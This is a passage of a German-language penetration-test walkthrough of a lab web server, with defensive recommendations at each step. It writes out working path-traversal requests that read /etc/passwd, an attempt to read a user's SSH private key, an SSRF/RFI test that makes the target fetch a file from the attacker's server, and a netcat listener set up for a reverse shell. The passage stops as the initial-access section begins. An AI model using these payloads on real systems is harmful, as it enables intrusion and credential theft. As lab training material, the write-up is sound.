+            **Empfehlung (Pentester):** Das Verständnis der Standard-HTTP-Kommunikation ist entscheidend, um Abweichungen bei Angriffen zu erkennen. Die Größe der Standardantwort ist ein nützliches Kriterium für das Filtern von Fuzzing-Ergebnissen.
+            <br>**Empfehlung (Admin):** Sicherstellen, dass unnötige Header entfernt oder minimiert werden, um die Informationspreisgabe zu reduzieren. Überprüfung der `Content-Length` im Normalbetrieb kann bei der Erkennung von Anomalien helfen, falls ein Angriff die Größe der Antwort verändert.
+        </p>
+        <pre>
+<span class="command">GET /index.php?event=birthday&amp;date=3881678400 HTTP/1.1</span>
+<span class="command">Host: 192.168.2.41</span>
+<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko:3881678400 Firefox/128.0</span>
+<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">DNT: 1</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Upgrade-Insecure-Requests: 1</span>
+<span class="command">Sec-GPC: 1</span>
+<span class="command">Priority: u=0, i</span>
+
+
+</pre>
+        <pre>
+<span class="password">HTTP/1.1 200 OK</span>
+<span class="command">Date: Fri, 13 Jun 2025 11:56:14 GMT</span>
+<span class="command">Server: Apache/2.4.57 (Debian)</span>
+<span class="command">Vary: Accept-Encoding</span>
+<span class="command">Content-Length: 1311</span>
+<span class="command">Keep-Alive: timeout=5, max=100</span>
+<span class="command">Connection: Keep-Alive</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+
+<span class="command"> </span>
+<span class="command">    &lt;h1&gt;Birthday invitation&lt;/h1&gt;     img src="anniv.jpg" alt="Birthday Image" class="birthday-image" </span>
+<span class="command"> </span>
+
+
+</pre>
+
+        <p class="analysis">
+            **Analyse:** Im Rahmen der Web-Enumeration ist es wichtig, alle potenziellen Parameter und ihre Interaktionen zu testen. Ich habe das Tool `ffuf` verwendet, ein schnelles Fuzzing-Tool, um den `event`-Parameter zu testen, diesmal aber mit dem `date`-Parameter fest auf "birthday" gesetzt und mit der Option `-r` (`--follow-redirects`). Das `-r` Flag ist hier entscheidend, wie im Text erklärt wird: es weist `ffuf` an, Weiterleitungen zu folgen. Der Filter (`-fs 461283 -fl 46`) wurde wahrscheinlich basierend auf der Größe/Zeilenanzahl der *Umleitungsseite* oder einer anderen spezifischen Antwort gewählt, um die Standard-Antworten auszublenden und potenziell interessante Ergebnisse zu finden.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** FFUF fand mit der Payload-Position `event=FUZZ` und dem festen `date=birthday` Wert erneut "birthday" als gültigen Wert. Die resultierende Größe (Size: 5616, Lines: 107) war deutlich anders als die Größe/Zeilen, die ich gefiltert habe. Dies bestätigt, dass die Kombination von `date=birthday` und `event=birthday` zu einer anderen Antwort als der gefilterten führt (vermutlich nicht die Umleitung, die ich gefiltert habe), was auf spezifische Anwendungslogik für diese Parameterkombination hindeutet. Die Erklärung im Text über die Bedeutung von `-r` unterstreicht, wie wichtig es ist, das Verhalten der Anwendung bei Weiterleitungen zu berücksichtigen.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Die Interaktion zwischen verschiedenen Parametern (`event` und `date`) ist ein wichtiger Hinweis. Testen, wie die Anwendung reagiert, wenn beide Parameter manipuliert werden oder spezifische Werte enthalten. Das `-r` Flag in FFUF ist für die Entdeckung von Ressourcen hinter Weiterleitungen unerlässlich.
+            <br>**Empfehlung (Admin):** Anwendungslogik, die auf spezifischen Parameterkombinationen basiert, sorgfältig prüfen. Sicherstellen, dass Weiterleitungen sicher behandelt werden und nicht zu Informationslecks oder zur Umgehung von Sicherheitsmechanismen führen.
+        </p>
+         <p>
+            Die Dokumentation über das `ffuf -r` Flag und seine Bedeutung:
+         </p>
+        <p class="analysis">
+            **Analyse:** Ich habe dokumentiert, was das Flag `-r` in FFUF bewirkt. Es steht für `--follow-redirects`, was bedeutet, dass FFUF bei einer HTTP-Antwort mit Statuscodes wie 301, 302 oder 307 automatisch der im `Location`-Header angegebenen URL folgt und die Antwort dieser neuen Seite analysiert.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Das Verstehen und Anwenden von `-r` ist kritisch beim Testen von Webanwendungen, die Weiterleitungen intensiv nutzen, wie diese hier. Ohne dieses Flag würde ich möglicherweise wichtige Zielseiten oder deren Antworten verpassen, da FFUF nur die initiale Redirect-Antwort sehen würde. Im Kontext dieses Ziels, das sofort auf eine URL mit Parametern umleitet, ist `-r` unerlässlich, um das Verhalten der eigentlichen Zielseite zu untersuchen.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Bei Fuzzing-Tools wie FFUF oder Wfuzz immer prüfen, ob Weiterleitungen relevant sind, und die entsprechende Option (`-r`, `-L`) nutzen.
+            <br>**Empfehlung (Admin):** Design von Webanwendungen so gestalten, dass Weiterleitungen sicher und vorhersehbar sind. Unnötige Weiterleitungsketten vermeiden. Sicherstellen, dass sensible Informationen nicht über Weiterleitungen preisgegeben werden.
+        </p>
+        <pre>
+Der Flag -r in ffuf ist extrem nützlich und oft der Schlüssel zum Erfolg.
+Was -r bedeutet
+
+<span class="command">-r ist die Kurzform für --follow-redirects.</span>
+</pre>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~/birthday]<br>└─# <span class="command">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.41/index.php?date=birthday&event=FUZZ" -r -fs 461283 -fl 46</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       <span class="password">v2.1.0-dev</span>
+________________________________________________
+
+ <span class="command">:: Method           : GET</span>
+ <span class="command">:: URL              : http://192.168.2.41/index.php?date=birthday&amp;event=FUZZ</span>
+ <span class="command">:: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+ <span class="command">:: Follow redirects : true</span>
+ <span class="command">:: Calibration      : false</span>
+ <span class="command">:: Timeout          : 10</span>
+ <span class="command">:: Threads          : 40</span>
+ <span class="command">:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span>
+ <span class="command">:: Filter           : Response size: 461283</span>
+ <span class="command">:: Filter           : Response lines: 46</span>
+________________________________________________
+
+<span class="command">birthday                [Status: 200, Size: 5616, Words: 1421, Lines: 107, Duration: 2ms]</span>
+<span class="password">:: Progress: [220547/220547] :: Job [1/1] :: 6896 req/sec :: Duration: [0:00:34] :: Errors: 0 ::</span>
+</pre>
+            </div>
+        </div>
+
+        <p class="analysis">
+            **Analyse:** Ich habe `curl -Iv` verwendet, um die Header der URL `http://192.168.2.41/index.php?date=birthday` zu überprüfen. Dies war wahrscheinlich ein Schritt, um das Verhalten zu verstehen, wenn nur der `date`-Parameter auf "birthday" gesetzt ist, wie im vorherigen `ffuf` Lauf, auch wenn der `event`-Parameter dort ebenfalls gefuzzt wurde. Der Output zeigt wieder eine 302 Found Weiterleitung.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Die Umleitung auf die ursprüngliche URL `/index.php?event=birthday&date=3881678400` wird bestätigt. Dies zeigt, dass das Setzen von `date=birthday` allein (ohne `event=birthday`) auf der `index.php` die Standard-Umleitung triggert. Es unterscheidet sich also vom Verhalten, wenn *beide* Parameter gesetzt sind, wie beim FFUF-Treffer. Es ist wichtig, diese verschiedenen Verhaltensweisen zu dokumentieren, um die Logik der Anwendung vollständig zu erfassen.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Jeder Parameterwert und jede Kombination kann eine andere Logik auslösen. Systematisch testen, wie sich die Anwendung mit verschiedenen Inputs verhält.
+            <br>**Empfehlung (Admin):** Anwendungslogik dokumentieren, um Missverständnisse oder unbeabsichtigte Interaktionen zwischen Parametern zu vermeiden. Sicherstellen, dass alle Parameter-Kombinationen sicher validiert werden.
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]<br>└─# <span class="command">curl -Iv http://192.168.2.41/index.php?date=birthday</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+[1] 33883
+<span class="password">*   Trying 192.168.2.41:80...</span>
+<span class="password">* Connected to 192.168.2.41 (192.168.2.41) port 80</span>
+* using HTTP/1.x
+> HEAD /index.php?date=birthday HTTP/1.1
+> Host: 192.168.2.41
+> User-Agent: curl/8.13.0
+> Accept: */*
+> 
+<span class="password">* Request completely sent off</span>
+<span class="password">< HTTP/1.1 302 Found</span>
+<span class="command">HTTP/1.1 302 Found</span>
+<span class="command">< Date: Fri, 13 Jun 2025 12:31:20 GMT</span>
+<span class="command">Date: Fri, 13 Jun 2025 12:31:20 GMT</span>
+<span class="command">< Server: Apache/2.4.57 (Debian)</span>
+<span class="command">Server: Apache/2.4.57 (Debian)</span>
+<span class="command">< Location: /index.php?event=birthday&amp;date=3881678400</span>
+<span class="command">Location: /index.php?event=birthday&amp;date=3881678400</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+< 
+
+<span class="password">* Connection #0 to host 192.168.2.41 left intact</span>
+[1]  <span class="password">+ done       curl -Iv http://192.168.2.41/index.php?date=birthday</span>
+</pre>
+            </div>
+        </div>
+
+        <p class="analysis">
+            **Analyse:** Ich habe eine weitere Seite entdeckt: `birthday_calculator.php`. Der Text auf dieser Seite trägt den Titel "Birthday Countdown Calculator" und zeigt ein Eingabefeld, das einen Geburtstag im Format JJJJ-MM-TT erwartet. Beim Aufruf mit `?dob=2093-01-01` wird "Your next birthday is in: 201 days!" angezeigt. Dieses Datum (`2093-01-01`) ist das gleiche, das ich zuvor aus dem Timestamp `3881678400` von der `index.php` extrahiert habe.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Die Entdeckung dieser Seite (`birthday_calculator.php`) und ihres `dob`-Parameters ist sehr relevant. Sie stellt einen weiteren, separaten Eingangspunkt dar, der wahrscheinlich Datumswerte verarbeitet. Die Tatsache, dass das spezielle Zukunftsdatum hier verwendet wird und eine sinnvolle (wenn auch für 2093 sinnlose) Ausgabe erzeugt, bestätigt die Verarbeitung dieses Datums und des Parameters. Dies ist ein vielversprechender Ort, um nach Datum-bezogenen oder Eingabe-Validierungs-Schwachstellen zu suchen.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Den `dob`-Parameter auf `birthday_calculator.php` gezielt auf Injection-Schwachstellen testen. Insbesondere auf Time-based SQLi, Command Injection oder PHP-Code-Injection, da Datumsfunktionen oft mit anderen Funktionen kombiniert werden. Testen, wie die Anwendung auf ungültige Datumsformate oder spezielle Zeichen reagiert.
+            <br>**Empfehlung (Admin):** Alle Benutzereingaben, insbesondere Datumsfelder, streng validieren. Keine Benutzereingaben ungeprüft in `eval()`, `system()` oder ähnliche gefährliche Funktionen einfügen. Bei der Berechnung von Zeitdifferenzen sicherstellen, dass die Eingabe sauber getrennt von der Logik verarbeitet wird.
+        </p>
+        <p>
+            Entdeckung der Seite `birthday_calculator.php` und ihres Verhaltens mit dem Datum aus dem Timestamp:
+        </p>
+        <pre>
+<span class="command">http://192.168.2.41/birthday_calculator.php?dob=2093-01-01</span>
+<span class="command">Birthday Countdown Calculator</span>
+<span class="command">Enter your birthdate (format yyyy-mm-dd): 2093-01-01</span>
+
+<span class="password">Your next birthday is in: 201 days!</span>
+</pre>
+
+        <p class="analysis">
+            **Analyse:** Ich habe eine weitere Seite entdeckt: `birthday_party_program.php`. Der Text auf dieser Seite erwähnt ein "Buffet catered by 'Gourmet Delights'" und zeigt einen HTML-Link (`a href=...`), der einen `page`-Parameter verwendet und scheinbar auf eine externe Website (`https://www.mcdonalds.com/`) verweist. Dies ist ein starker Hinweis auf eine potenzielle Datei- oder URL-Einbindungsschwachstelle.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Die `birthday_party_program.php` Seite mit ihrem `page`-Parameter ist ein extrem relevanter Fund. Das Muster `?page=...` ist klassisch für LFI (Local File Inclusion) oder RFI (Remote File Inclusion) Anfälligkeiten. Wenn der Server den Wert des `page`-Parameters nimmt und den Inhalt der angegebenen Datei oder URL einbindet oder anzeigt, kann dies ausgenutzt werden, um lokale Systemdateien zu lesen oder sogar Code auszuführen (bei RFI, falls PHP-Flags wie `allow_url_include` aktiv sind).
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Diese Seite und den `page`-Parameter sofort auf LFI/RFI testen. Versuchen, Systemdateien (`/etc/passwd`, `/etc/shadow`, Serverkonfigurationen) zu lesen. Versuchen, externe URLs einzubinden (SSRF-Test).
+            <br>**Empfehlung (Admin):** Parameter, die Dateipfade oder URLs entgegennehmen, sind Hochrisikofaktoren. Die Verwendung solcher Parameter sollte vermieden oder nur mit extrem strengen Validierungs- und Whitelisting-Maßnahmen implementiert werden. Funktionen, die externe Inhalte einbinden, sollten deaktiviert sein, wenn nicht explizit benötigt.
+        </p>
+        <p>
+            Entdeckung der Seite `birthday_party_program.php` und ihres `page`-Parameters:
+        </p>
+        <pre>
+<span class="command">http://192.168.2.41/birthday_party_program.php</span>
+    a class="service" href="birthday_party_program.php?page=https://www.mcdonalds.com/" Buffet catered by 'Gourmet Delights'
+          Gourmet Delights  have curated a gastronomic adventure that boasts of flavors from around the globe. 
+          Their experienced chefs guarantee a treat to your taste buds, ensuring no one leaves without a satisfied palate. 
+             We can't thank 'Gourmet Delights' enough for tantalizing our taste buds with their culinary magic! 
+</pre>
+
+        <p class="analysis">
+            **Analyse:** Ich teste die LFI-Anfälligkeit auf `birthday_party_program.php` indem ich den `page`-Parameter auf einen Pfad-Traversal-Payload setze, der auf `/etc/passwd` verweist: `page=../../../../../../../../../../../../etc/passwd`. Der lange Pfad-Traversal-String (`../../../../../../../../../../../../`) dient dazu, sicher aus jedem möglichen Unterverzeichnis im Webroot in das Wurzelverzeichnis `/` zu navigieren.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** **Erfolg!** Die Ausgabe zeigt den vollständigen Inhalt der `/etc/passwd` Datei. Dies bestätigt eine klassische und ausnutzbare Local File Inclusion (LFI) Schwachstelle auf der Seite `birthday_party_program.php`. Ich kann nun beliebige Dateien lesen, auf die der Webserver-Prozess (wahrscheinlich `www-data`) Zugriff hat. Dies ist ein kritischer Schritt, da ich dadurch Informationen über Systembenutzer, Konfigurationen oder sogar Quellcode erhalten kann.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Diese LFI nutzen, um weitere Systemdateien zu lesen (z.B. Webserver-Konfigurationen, PHP-Quellcode, Nutzer-spezifische Dateien). Informationen aus `/etc/passwd` (Benutzer, Shells) für weitere Schritte (z.B. Brute-Force von SSH, Suche nach schwachen Konfigurationen) nutzen.
+            <br>**Empfehlung (Admin):** **Dringend:** Die `page`-Parameter-Verarbeitung auf `birthday_party_program.php` muss sofort korrigiert werden. Jegliche Dateieinbindung basierend auf Benutzereingaben strikt unterbinden oder nur über eine sichere Whitelist von erlaubten Dateinamen (ohne Pfade) zulassen. `allow_url_include` in PHP.ini deaktivieren, falls es aktiv ist.
+        </p>
+        <p>
+            Ausnutzung der LFI auf `birthday_party_program.php` zum Lesen von `/etc/passwd`:
+        </p>
+        <pre>
+<span class="command">view-source:http://192.168.2.41/birthday_party_program.php?page=../../../../../../../../../../../../etc/passwd</span>
+
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="command">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="command">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="command">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="command">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="command">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="command">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="command">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="command">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="command">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="command">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="command">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="command">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="command">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="command">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span>
+<span class="command">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="command">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin</span>
+<span class="command">systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin</span>
+<span class="command">messagebus:x:100:107::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span>
+<span class="command">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="command">chloe:x:1001:1001::/home/chloe:/bin/bash</span>
+<span class="command">distccd:x:103:65534::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">bacula:x:104:112:Bacula:/var/lib/bacula:/usr/sbin/nologin</span>
+<span class="command">netdata:x:999:996::/var/lib/netdata:/bin/sh</span>
+</pre>
+
+        <p class="analysis">
+            **Analyse:** Nachdem ich `/etc/passwd` lesen konnte, filtere ich die Ausgabe, um schnell alle Benutzer zu finden, die eine interaktive Shell zugewiesen haben. Das `grep sh` nach der LFI-URL mit `curl -s` (um Curl-Statusmeldungen zu unterdrücken) liefert mir diese Liste. Eine interaktive Shell (`/bin/bash` oder `/bin/sh`) ist ein starker Indikator dafür, dass dies ein regulärer Benutzer-Account ist, der für die Anmeldung (z.B. via SSH) verwendet werden könnte.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Die Liste zeigt `root`, `sshd`, `chloe`, und `netdata` mit Shells. Der `root` Benutzer hat die Shell `/bin/bash`, ist aber selten direkt per Passwort zugänglich (wenn, dann wäre das ein sofortiger Root-Zugriff). `sshd` ist ein Systembenutzer. `chloe` (UID 1001) ist ein typischer, nicht-privilegierter Benutzer. `netdata` (UID 999) hat `/bin/sh`, was ebenfalls eine interaktive Shell ermöglicht. `chloe` ist der vielversprechendste Kandidat für den ersten Login-Versuch, da sie eine Standard-Bash-Shell hat und wahrscheinlich ein Home-Verzeichnis besitzt.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Den Benutzer `chloe` als primäres Ziel für Initial Access (z.B. via SSH oder Web-Login, falls gefunden) ins Auge fassen. Nach Dateien im Home-Verzeichnis von `chloe` (und potenziell `netdata`) suchen, die über LFI zugänglich sind (.ssh Verzeichnis, Konfigurationsdateien, History-Dateien, etc.).
+            <br>**Empfehlung (Admin):** Systembenutzern wie `sshd` oder `netdata` keine interaktive Shell zuweisen, wenn sie nicht benötigt wird. Unnötige Benutzer-Accounts entfernen. Passwort-Richtlinien für alle Benutzer erzwingen und Brute-Force-Schutz (z.B. Fail2ban für SSH) implementieren.
+        </p>
+        <p>
+            Filtern von `/etc/passwd` nach Benutzern mit Shells:
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~/birthday]<br>└─# <span class="command">curl http://192.168.2.41/birthday_party_program.php?page=../../../../../../../../../../../../etc/passwd -s| grep sh</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="command">chloe:x:1001:1001::/home/chloe:/bin/bash</span>
+<span class="command">netdata:x:999:996::/var/lib/netdata:/bin/sh</span>
+</pre>
+            </div>
+        </div>
+
+        <p class="analysis">
+            **Analyse:** Mit der bestätigten LFI auf `birthday_party_program.php` versuche ich, die SSH-Privatschlüsseldatei (`id_rsa`) des Benutzers `netdata` zu lesen. Die Datei befindet sich typischerweise im `.ssh`-Verzeichnis im Home-Verzeichnis des Benutzers (`/home/netdata/.ssh/id_rsa`). Ich verwende denselben Path-Traversal-Payload wie zuvor.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Der Versuch scheiterte mit der Meldung "The file does not exist or the URL is not valid." Dies bedeutet entweder, dass der Benutzer `netdata` keine SSH-Schlüsseldatei unter diesem Pfad hat, oder dass es spezifische Einschränkungen für die LFI gibt, die das Lesen dieser Datei verhindern (z.B. Filterung von Punkten `.` im Pfad oder spezifische Dateitypen). Es ist eine negative Erkenntnis, aber wichtig, um festzuhalten, was *nicht* funktioniert.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Nicht aufgeben! Testen, ob die öffentliche Schlüsseldatei (`id_rsa.pub`) gelesen werden kann, um die Pfadannahme zu verifizieren. Testen, ob die LFI das Lesen von Dateien mit Punkten im Namen oder in Verzeichnissen erlaubt. Versuchen, die SSH-Schlüsseldatei für den Benutzer `chloe` zu lesen (`/home/chloe/.ssh/id_rsa`). Nach anderen potenziellen Dateien mit Anmeldedaten suchen (z.B. `.bash_history`, `.mysql_history`, Konfigurationsdateien von Anwendungen).
+            <br>**Empfehlung (Admin):** Sicherstellen, dass LFI-Schwachstellen behoben sind (wie oben empfohlen). Private Schlüsseldateien (`id_rsa`) sollten niemals für den Webserver-Benutzer lesbar sein. `.ssh`-Verzeichnisse sollten restriktive Berechtigungen haben (typischerweise 700 für das Verzeichnis, 600 für private Schlüssel).
+        </p>
+        <p>
+            Versuch, den SSH-Privatschlüssel für den Benutzer `netdata` über LFI zu lesen:
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]<br>└─# <span class="command">curl http://192.168.2.41/birthday_party_program.php?page=../../../../../../../../../../../../home/netdata/.ssh/id_rsa -s</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+
+    <span class="command">&lt;p&gt;Thank you all for being part of our special day!&lt;/p&gt;</span>
+    
+
+<span class="password">The file does not exist or the URL is not valid.</span>
+</pre>
+            </div>
+        </div>
+
+        <p class="analysis">
+            **Analyse:** Um zu testen, ob die LFI auf `birthday_party_program.php` auch Remote File Inclusion (RFI) oder Server-Side Request Forgery (SSRF) zulässt, habe ich einen kleinen HTTP-Server auf meiner Angreifer-Maschine (192.168.2.199) gestartet. Ich habe eine einfache Textdatei (`ben.txt`) erstellt und dann versucht, diese Datei über die LFI-Schwachstelle auf dem Zielsystem anzufordern (`curl -s "http://192.168.2.41/birthday_party_program.php?page=http://192.168.2.199/ben.txt"`). Ich beobachte die Ausgabe meines HTTP-Servers.
+        </p>
+        <p class="evaluation">
+            **Bewertung:** **Erfolg!** Mein lokaler HTTP-Server hat eine GET-Anfrage von der IP des Zielsystems (192.168.2.41) für die Datei `/ben.txt` protokolliert. Dies beweist, dass die `page`-Parameter-Verarbeitung auf `birthday_party_program.php` anfällig für Server-Side Request Forgery (SSRF) ist und möglicherweise auch Remote File Inclusion (RFI) zulässt (abhängig von der PHP-Konfiguration `allow_url_include`). Die Seite versucht, die von mir angegebene externe URL abzurufen. Dies ist eine sehr kritische Schwachstelle.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Diese SSRF/RFI-Anfälligkeit ausnutzen. Testen, ob das `file://` Schema verwendet werden kann, um Dateien über SSRF zu lesen (oft eine Alternative zu LFI, falls LFI-Filter umgangen werden müssen). Testen, ob Gopher-Wrapper für Post-Anfragen oder andere Protokolle genutzt werden können. Die Möglichkeit, interne Netzwerke über die Zielmaschine zu scannen, besteht.
+            <br>**Empfehlung (Admin):** **Dringend:** Die Anfälligkeit beheben. Jegliche URL- oder Dateieinbindung basierend auf Benutzereingaben deaktivieren oder streng über eine Whitelist sicherer, interner Ressourcen reglementieren. Sicherstellen, dass `allow_url_fopen` und `allow_url_include` in PHP.ini deaktiviert sind, wenn nicht absolut notwendig. Firewall-Regeln implementieren, die ausgehende Verbindungen vom Webserver einschränken.
+        </p>
+        <p>
+            Testen auf RFI/SSRF auf `birthday_party_program.php` mit einem lokalen HTTP-Server:
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">python3 -m http.server 80</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</pre>
+            </div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">echo "test" &gt; ben.txt</span></div>
+            </div>
+            <div class="terminal"><pre></pre></div>
+        </div>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -s "http://192.168.2.41/birthday_party_program.php?page=http://192.168.2.199/ben.txt"</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+    <span class="command">&lt;p&gt;Thank you all for being part of our special day!&lt;/p&gt;</span>
+
+</pre>
+            </div>
+        </div>
+         <p class="analysis">
+            **Analyse:** Ich zeige hier den Log meines `python3 http.server` nachdem ich die `curl`-Anfrage vom Zielsystem (`192.168.2.41`) ausgelöst habe.
+        </p>
+         <p class="evaluation">
+            **Bewertung:** Das Log `192.168.2.41 - - [13/Jun/2025 15:14:51] "GET /ben.txt HTTP/1.1" 200 -` ist der eindeutige Beweis dafür, dass die Zielmaschine eine ausgehende HTTP-Verbindung zu meiner Maschine hergestellt hat, um die von mir im `page`-Parameter angegebene URL abzurufen. Dies ist die Bestätigung der Server-Side Request Forgery (SSRF) Schwachstelle.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Diese SSRF-Anfälligkeit ist ein Hauptvektor für Initial Access oder weitere Enumeration. Sofort nutzen, um interne Netzwerke zu erkunden oder potenzielle interne Dienste zu identifizieren.
+            <br>**Empfehlung (Admin):** Ausgehende Verbindungen von Webservern streng reglementieren. Standardmäßig sollten Webserver keine Verbindungen zu externen Hosts oder internen Netzwerksegmenten herstellen können, die nicht explizit erlaubt sind. Implementierung einer Whitelist für erlaubte Ziele von ausgehenden Verbindungen.
+        </p>
+         <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">python3 -m http.server 80</span></div>
+            </div>
+             <div class="terminal">
+                <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+<span class="password">192.168.2.41 - - [13/Jun/2025 15:14:51] "GET /ben.txt HTTP/1.1" 200 -</span>
+</pre>
+            </div>
+        </div>
+
+
+        <p class="analysis">
+            **Analyse:** Ich richte einen Netcat-Listener auf meiner Angreifer-Maschine (192.168.2.199) auf Port 9001 ein. Der Befehl `nc -lvnp 9001` startet den Listener: `-l` (listen), `-v` (verbose), `-n` (numerische IPs, keine DNS-Lookups), `-p 9001` (Port 9001).
+        </p>
+        <p class="evaluation">
+            **Bewertung:** Dies ist ein Standardvorgehen, wenn eine Reverse Shell erwartet wird. Nachdem ich die SSRF-Fähigkeit bestätigt habe und auf verschiedenen Seiten Parameter gefunden habe, die nach Injection aussehen, ist der nächste logische Schritt, zu versuchen, Code auszuführen und eine Shell-Verbindung zurück zu meiner Maschine aufzubauen. Der Listener ist die notwendige Vorbereitung auf meiner Seite.
+        </p>
+        <p class="recommendation">
+            **Empfehlung (Pentester):** Immer einen Listener einrichten, bevor eine Reverse Shell ausgelöst wird. Geeigneten Port wählen, der auf der Angreifer-Maschine nicht von anderen Diensten belegt ist und potenziell vom Zielsystem ausgehend erreicht werden kann (typischerweise hohe Ports oder bekannte Webports 80/443, falls der Traffic dort gefiltert wird).
+            <br>**Empfehlung (Admin):** Ausgehende Verbindungen von Systemen restriktiv filtern. Reverse Shells versuchen oft, Verbindungen zu ungewöhnlichen Ports auf externen Hosts aufzubauen. Eine Firewall, die nur erlaubte ausgehende Verbindungen zulässt (z.B. nur zu Updateservern auf Port 443), kann Reverse Shells effektiv blockieren.
+        </p>
+        <p>
+            Vorbereitung des Listeners auf meiner Maschine, um eine Reverse Shell zu empfangen:
+        </p>
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+            </div>
+            <div class="terminal">
+                <pre>
+<span class="password">listening on [any] 9001 ...</span>
+</pre>
+            </div>
+        </div>
+```
+
+**Teil 3 von 3**
+
+```html
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis">
